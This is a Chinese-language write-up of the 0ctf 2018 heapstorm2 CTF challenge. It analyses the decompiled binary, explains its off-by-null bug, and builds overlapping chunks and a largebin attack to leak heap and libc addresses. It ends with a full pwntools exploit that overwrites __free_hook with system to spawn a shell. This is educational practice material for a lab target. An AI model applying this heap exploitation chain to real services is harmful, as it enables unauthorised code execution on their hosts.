# 0ctf heapstorm2

### 0x0 前置补偿

靶场在[BUUCTF](https://buuoj.cn/)

[ptmalloc利用之largebin attack](https://www.anquanke.com/post/id/183877#h2-4)

[glibc-2.29 large bin attack 原理](https://www.anquanke.com/post/id/189848#h2-3)

### 0x1 分析

检查一下安全性：

```shell
[*] './0ctf_2018_heapstorm2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

都开着，真好。拖进IDA看看有没有什么漏洞可以利用吧

`main()`:

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _QWORD *heap; // [rsp+8h] [rbp-8h]

  heap = (_QWORD *)preload();
  while ( 1 )
  {
    menu();
    getNum();
    switch ( (unsigned __int64)off_180C )
    {
      case 1uLL:
        Allocate(heap);
        break;
      case 2uLL:
        Update(heap);
        break;
      case 3uLL:
        Delete(heap);
        break;
      case 4uLL:
        View(heap);
        break;
      case 5uLL:
        return 0LL;
      default:
        continue;
    }
  }
}
```

这是一个经典的菜单函数。增删改查都有。但是有个预处理的函数`preload()`:

```c
signed __int64 preload()
{
  signed int i; // [rsp+8h] [rbp-18h]
  int fd; // [rsp+Ch] [rbp-14h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  alarm(0x3Cu);
  puts(
    "    __ __ _____________   __   __    ___    ____\n"
    "   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"
    "  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"
    " / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"
    "/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n");
  puts("===== HEAP STORM II =====");
  if ( !mallopt(1, 0) )
    exit(-1);
  if ( mmap(&unk_13370000, 0x1000uLL, 3, 34, -1, 0LL) != &unk_13370000 )
    exit(-1);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
    exit(-1);
  if ( read(fd, qword_13370800, 0x18uLL) != 0x18 )
    exit(-1);
  close(fd);
  qword_13370800[3] = qword_13370800[2];
  for ( i = 0; i <= 15; ++i )
  {
    qword_13370800[2 * (i + 2LL)] = xor0(qword_13370800, 0LL);
    qword_13370800[2 * (i + 2LL) + 1] = xor1(0x13370800LL, 0LL);
  }
  return 0x13370800LL;
}                                               // 
                                                // |8LL|8LL|<--0x13370800LL
                                                // |8LL|8LL|
                                                // |0  |0  |<--|ptr |size|
                                                // |1  |1  |
                                                // ```
                                                // |15 |15 |
```

这里主要是做了这么几件事：

1. `mallopt(1, 0)`关闭了Fastbin
2. `mmap(&unk_13370000, 0x1000uLL, 3, 34, -1, 0LL) != &unk_13370000`申请了`0x1000`的匿名空间，后面看了`Allocate()`函数，我们会知道这是存放`chunk`的位置，相当于全局变量。
3. 在`0x13370800LL`这个位置存放了`0x20`长度的随机数。而且`qword_13370800[3] = qword_13370800[2];`。然后返回了这个位置。

`Allocate()`:

```c
void __fastcall Allocate(_QWORD *heap)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int size; // [rsp+14h] [rbp-Ch]
  void *chunk; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !xor1((__int64)heap, heap[2 * (i + 2LL) + 1]) )
    {
      printf("Size: ");
      size = getNum();
      if ( size > 0xC && size <= 0x1000 )
      {
        chunk = calloc(size, 1uLL);             // mem = 0
        if ( !chunk )
          exit(-1);
        heap[2 * (i + 2LL) + 1] = xor1((__int64)heap, size);
        heap[2 * (i + 2LL)] = xor0(heap, (__int64)chunk);
        printf("Chunk %d Allocated\n", (unsigned int)i);
      }
      else
      {
        puts("Invalid Size");
      }
      return;
    }
  }
}
```

没什么特别注意的，有一点是，`size`字段和`chunk ptr`字段在存放的时候和之前的随机数经过了一个异或操作。我们在泄漏的时候很麻烦。

`Update`：编辑函数

```c
int __fastcall Update(_QWORD *heap)
{
  __int64 ptr; // ST18_8
  __int64 v3; // rax
  signed int idx; // [rsp+10h] [rbp-20h]
  int size; // [rsp+14h] [rbp-1Ch]

  printf("Index: ");
  idx = getNum();
  if ( idx < 0 || idx > 15 || !xor1((__int64)heap, heap[2 * (idx + 2LL) + 1]) )
    return puts("Invalid Index");
  printf("Size: ");
  size = getNum();
  if ( size <= 0 || size > (unsigned __int64)(xor1((__int64)heap, heap[2 * (idx + 2LL) + 1]) - 12) )// new size > old size - 0xc
    return puts("Invalid Size");
  printf("Content: ");
  ptr = xor0(heap, heap[2 * (idx + 2LL)]);
  readUnsafe(ptr, size);
  v3 = size + ptr;
  *(_QWORD *)v3 = 'ROTSPAEH';
  *(_DWORD *)(v3 + 8) = 'II_M';
  *(_BYTE *)(v3 + 12) = 0;                      // off by null
  return printf("Chunk %d Updated\n", (unsigned int)idx);
}
```

最后`0xc`长度的内存被占用，另外有一个`off by null`漏洞:`*(_BYTE *)(v3 + 12) = 0; `。

`Delete`:

```c
int __fastcall Delete(_QWORD *heap)
{
  void *ptr; // rax
  signed int idx; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  idx = getNum();
  if ( idx < 0 || idx > 15 || !xor1((__int64)heap, heap[2 * (idx + 2LL) + 1]) )
    return puts("Invalid Index");
  ptr = (void *)xor0(heap, heap[2 * (idx + 2LL)]);
  free(ptr);
  heap[2 * (idx + 2LL)] = xor0(heap, 0LL);      // No UAF
  heap[2 * (idx + 2LL) + 1] = xor1((__int64)heap, 0LL);
  return printf("Chunk %d Deleted\n", (unsigned int)idx);
}
```

这里我们看到，`free`之后直接‘’置零“。没有UAF。

`View`:

```c
int __fastcall View(_QWORD *heap)
{
  __int64 v2; // rbx
  __int64 v3; // rax
  signed int idx; // [rsp+1Ch] [rbp-14h]

  if ( (heap[3] ^ heap[2]) != 0x13377331LL )
    return puts("Permission denied");
  printf("Index: ");
  idx = getNum();
  if ( idx < 0 || idx > 15 || !xor1((__int64)heap, heap[2 * (idx + 2LL) + 1]) )
    return puts("Invalid Index");
  printf("Chunk[%d]: ", (unsigned int)idx);
  v2 = xor1((__int64)heap, heap[2 * (idx + 2LL) + 1]);
  v3 = xor0(heap, heap[2 * (idx + 2LL)]);
  print(v3, v2);
  return puts(byte_180A);
}
```

这里有个检测` (heap[3] ^ heap[2]) != 0x13377331LL`。

然后就直接输出`chunk`的内容了。

#### 思路

看了师傅的WP，调试出来的。

因为有一个`off_by_null`漏洞，可以用[poison_null_byte.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/poison_null_byte.c)的思路来构造`overlap chunk`，结合Largebin Attack来做。

首先创造出overlap chunk。

```python
alloc(0x18)     #0
alloc(0x508)    #1
alloc(0x18)     #2
update(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size

free(1)
update(0, 'h'*(0x18-12))    #off-by-one
alloc(0x18)     #1
alloc(0x4d8)    #7
free(1)
free(2)         #backward consolidate
alloc(0x38)     #1
alloc(0x4e8)    #2
```

这样`chunk1`和`chunk7`，`chunk2`重叠，只要计算距离，`chunk1`可以修改`chunk7`的堆头，`chunk7`可以修改`chunk2`的堆头。

同样的在制作一个overlap chunk

```python
alloc(0x18)     #3
alloc(0x508)    #4
alloc(0x18)     #5
update(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
alloc(0x18)     #6

free(4)
update(3, 'h'*(0x18-12))    #off-by-one
alloc(0x18)     #4
alloc(0x4d8)    #8
free(4)
free(5)         #backward consolidate

alloc(0x48)     #4
```

这样`chunk4`和`chunk8`重叠，`chunk4`可以修改`chunk8`的堆头。

然后就是利用unsorted bin中的chunk插入到large bin写数据，绕过对unsortbin中chunk的size大小的检查。

```python
free(2)
alloc(0x4e8)    #2
free(2)

storage = 0x13370000 + 0x800
fake_chunk = storage - 0x20

p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
p1 += p64(0) + p64(fake_chunk)      #bk
update(7, p1)

p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
update(8, p2)
```

`free(2)`之后，`chunk2`被放到了Unsorted bin中，但是在这之前`chunk8`的一部分也在Unsorted bin，所以它被放到了Large bin中，这段我们是可以控制的，所以我们满足了Largebin Attack的要求，我们可以控制`bk_nextsize`和`bk`指针。

然后构造`chunk8`在Unsorted bin的那一部分的`bk`和`bk_nextsize`指针，让他们指向我们需要修改的地方。

```python
try:
    # if the heap address starts with "0x56", you win
    alloc(0x48)     #2
except EOFError:
    # otherwise crash and try again
    r.close()
    continue
```

这里详细说一下这样构造`fake_chunk`的目的。

这里使用Largebin Attack:

`chunk2`地址末尾是`0x060`。

我们`alloc(0x48)`时会将`chunk2`放入large bin。在这个过程中会让`fwd->fd->bk_nextsize->fd_nextsize = chunk2;`，即`*(0x13370000 + 0x800 - 0x20 - 0x18 - 5 + 0x20)  = *(0x13370800 - 0x18 - 5) = chunk2`。

然后`fwd->bk = chunk2`

这时，`chunk2`被放入Largebin，然后接下来分配`0x48`会在我们伪造的`bk`也就是`fake_chunk`上分配，因为Unsorted bin只有这个`chunk`了。

这是检查`size`字段也就是`0x13370800 - 0x20 + 0x8`,而这里刚好被我们修改，就在刚才的`fwd->fd->bk_nextsize->fd_nextsize = chunk2;`。所以这里变成了`0x56`或者`0x50`。因为ASLR的关系，需要多次尝试，直到出现`0x56`。因为mmap的`chunk`的标识位被置位。

```python
pwndbg> x/4gx 0x133707e0
0x133707e0:     0x49a7dea060000000      0x0000000000000056
0x133707f0:     0x00007f56ba63fb78      0x00005649a7dea060
```

再往后就是leak heap和libc了。

我们能想到的就是通过`main_arena`来leak libc。所以我们要先知道`main_arena`。

```python
payload = p64(0)*2 + p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage)
update(2, payload)

payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(storage-0x20+3) + p64(8)
update(0, payload)

leak = view(1)
heap = u64(leak)
print ('heap: %x' % heap)
```

这个时候的`chunk2`就是`0x133707f0`了。由于申请大小的关系，我们需要构造`chunk0`的指针指向`storage`，修改大小，然后从`chunk1`那里来操作。

首先泄漏在heap指针来得到我们之前申请过的`chunk`，由于我们知道它与heap base的偏移量。我们就可以得到heap base。

然后我们发现这个时候这个chunk里有main_area:

```shell
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x5650f30ea060 —▸ 0x7f6e70b42b78 (main_arena+88) ◂— 0x5650f30ea060
BK: 0x5650f30ea060 —▸ 0x133707e8 ◂— 0x0
smallbins
empty
largebins
0x4c0 [corrupted]
FD: 0x5650f30ea5c0 ◂— 0x0
BK: 0x5650f30ea5c0 —▸ 0x5650f30ea060 —▸ 0x133707e8 ◂— 0x0
pwndbg> x/4gx 0x133707e0
0x133707e0:     0x50f30ea060000000      0x0000000000000056
0x133707f0:     0x0000000000000000      0x0000000000000000
```

所以相同的思路构造payload来leak libc。

```python
payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8)
update(0, payload)

leak = view(1)
unsorted_bin = u64(leak)
main_arena = unsorted_bin - 88
libc_base = main_arena - 0x3c4b20		//main_aren 
print ('libc_base: %x' % libc_base)
```

然后写入gadget拿shell。

需要注意的是：`main_arena`和`libc_base`的偏移可以用main_arena_offset工具来得到，也有其他方法。

```shell
➜  0ctf_2018_heapstorm2 main_arena /lib/x86_64-linux-gnu/libc.so.6
[+]libc version : glibc 2.23
[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a
[+]main_arena_offset : 0x3c4b20
```

### 0x2 EXP

稍加改动。

```python
#!/usr/bin/env python
# encoding: utf-8

#flag{Seize it, control it, and exploit it. Welcome to the House of Storm.}

import itertools
from hashlib import sha256
from pwn import *

context(arch='amd64', os='linux', log_level='info')
context.terminal = ['tmux', 'splitw', '-h']
r = None
def alloc(size):
    r.sendline('1')
    r.recvuntil('Size: ')
    assert(12 < size <= 0x1000)
    r.sendline('%d' % size)
    r.recvuntil('Command: ')

def update(idx, content):
    r.sendline('2')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Size: ')
    r.sendline('%d' % len(content))
    r.recvuntil('Content: ')
    r.send(content)
    r.recvuntil('Command: ')

def free(idx):
    r.sendline('3')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    r.recvuntil('Command: ')

def view(idx):
    r.sendline('4')
    r.recvuntil('Index: ')
    r.sendline('%d' % idx)
    m = r.recvuntil('Command: ')
    pos1 = m.find(']: ') + len(']: ')
    pos2 = m.find('\n1. ')
    return m[pos1:pos2]

def exploit(host):
    global r
    port = 27164

    while True:
        # r = remote(host, port)
        r = process('./0ctf_2018_heapstorm2')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        r.recvuntil('Command: ')

        alloc(0x18)     #0
        alloc(0x508)    #1
        alloc(0x18)     #2
        update(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size

        alloc(0x18)     #3
        alloc(0x508)    #4
        alloc(0x18)     #5
        update(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
        alloc(0x18)     #6

        free(1)
        update(0, 'h'*(0x18-12))    #off-by-one
        alloc(0x18)     #1
        alloc(0x4d8)    #7
        free(1)
        free(2)         #backward consolidate
        alloc(0x38)     #1
        alloc(0x4e8)    #2

        free(4)
        update(3, 'h'*(0x18-12))    #off-by-one
        alloc(0x18)     #4
        alloc(0x4d8)    #8
        free(4)
        free(5)         #backward consolidate
        alloc(0x48)     #4

        free(2)
        alloc(0x4e8)    #2
        free(2)

        storage = 0x13370000 + 0x800
        fake_chunk = storage - 0x20

        p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
        p1 += p64(0) + p64(fake_chunk)      #bk
        update(7, p1)

        p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
        p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
        p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
        update(8, p2)

        try:
            # if the heap address starts with "0x56", you win
            alloc(0x48)     #2
        except EOFError:
            # otherwise crash and try again
            r.close()
            continue
        # gdb.attach(r, 'bin\n')
        # pause()
        payload = p64(0)*2 + p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage)
        update(2, payload)

        payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(storage-0x20+3) + p64(8)
        update(0, payload)

        leak = view(1)
        heap = u64(leak)
        print ('heap: %x' % heap)
        # gdb.attach(r, 'bin\n')
        # pause()

        payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8)
        update(0, payload)

        leak = view(1)
        unsorted_bin = u64(leak)
        main_arena = unsorted_bin - 88
        libc_base = main_arena - 0x3c4b20
        print ('libc_base: %x' % libc_base)
        libc_system = libc_base + libc.symbols['system']
        free_hook = libc_base + libc.symbols['__free_hook']

        payload = p64(0) + p64(0) + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(free_hook) + p64(0x100) + p64(storage+0x50) + p64(0x100) + '/bin/sh\0'
        update(0, payload)
        update(1, p64(libc_system))

        r.sendline('3')
        r.recvuntil('Index: ')
        r.sendline('%d' % 2)
        break

if __name__ == '__main__':
    host = 'node3.buuoj.cn'
    exploit(host)
    r.interactive()
```

